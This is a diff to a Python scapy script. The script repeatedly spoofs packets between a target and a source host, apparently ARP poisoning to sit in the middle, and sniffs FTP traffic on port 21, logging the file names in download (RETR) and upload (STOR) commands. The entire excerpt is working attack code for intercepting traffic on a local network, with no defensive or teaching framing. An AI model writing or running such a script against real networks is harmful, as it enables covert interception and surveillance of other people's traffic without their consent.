@@ -18,5 +18,17 @@ def spoofing(ip_dst, mac_dst, ip_src):
 	scapy.send(packet, verbose=False)
 
 
-spoofing(ip_target, mac_target, ip_src)
-spoofing(ip_src, mac_src, ip_target)
+def packet_callback(packet):
+	print("enter")
+	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
+		payload = packet[scapy.Raw].load
+		if b"RETR" in payload:
+			print(f"Downloading: {payload.decode()[5:-2]}")
+		elif b"STOR" in payload:
+			print(f"Uploading: {payload.decode()[5:-2]}")
+
+
+while True:
+	spoofing(ip_target, mac_target, ip_src)
+	spoofing(ip_src, mac_src, ip_target)
+	scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
